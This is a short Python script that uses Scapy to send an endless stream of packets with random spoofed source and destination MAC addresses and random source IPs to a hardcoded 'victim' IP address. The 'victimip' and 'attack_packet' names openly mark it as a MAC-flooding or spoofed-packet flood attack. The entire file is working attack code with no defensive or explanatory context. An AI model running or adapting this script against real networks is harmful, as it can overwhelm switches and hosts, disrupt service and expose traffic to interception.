from scapy.all import *
import time

victimip="172.16.1.130"
attack_packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(),dst=victimip)

try:
    while True:
        sendp(attack_packet)
        time.sleep(0.1)
except KeyboardInterrupt:
    quit()